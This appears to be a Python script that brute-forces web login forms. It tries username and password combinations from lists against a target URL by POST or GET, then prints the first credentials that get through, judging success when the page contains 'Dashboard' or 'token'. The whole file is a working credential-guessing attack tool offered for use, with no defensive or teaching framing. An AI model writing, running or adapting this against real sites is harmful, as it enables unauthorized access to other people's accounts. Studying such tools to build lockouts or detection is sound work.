import requests


def brute(parameters):
    content = {'url': parameters['url'],
               'method': parameters['method'],
               'user_param': parameters['user_param'],
               'password_param': parameters['password_param'],
               'fail_text': parameters['fail_text'],
               }
    if parameters['user_list']:
        for user in parameters['user_list']:
            content['username'] = user
            if parameters['password_list']:
                for password in parameters['password_list']:
                    content['password'] = password
                    if attack(content):
                        print('login successful\n', 'user: ', content['username'])
                        print('password: ', content['password'])
                        exit(0)
            else:
                content['password'] = parameters['password']
                if attack(content):
                    print('login successful\n', 'user: ', content['username'])
                    print('password: ', content['password'])
                    exit(0)
    elif parameters['password_list']:
        content['username'] = parameters['username']
        for password in parameters['password_list']:
            content['password'] = password
            if attack(content):
                print('login successful\n', 'user: ', content['username'])
                print('password: ', content['password'])
                exit(0)
    else:
        content['username'] = parameters['username']
        content['password'] = parameters['password']
        if attack(content):
            print('login successful\n', 'user: ', content['username'])
            print('password: ', content['password'])
            exit(0)


def attack(content):
    payload = {
        content['user_param']: content['username'],
        content['password_param']: content['password'],
    }
    # Doing the post/get form
    if content['method'] == 'post':
        request = requests.post(content['url'], data=payload)
    else:
        request = requests.get(content['url'], data=payload)
    return check_login(request)


def check_login(request):
    if 'Dashboard' in request.text:
        return True
    if request.text.__contains__('token'):
        return True
    # print(request.text)
    return False

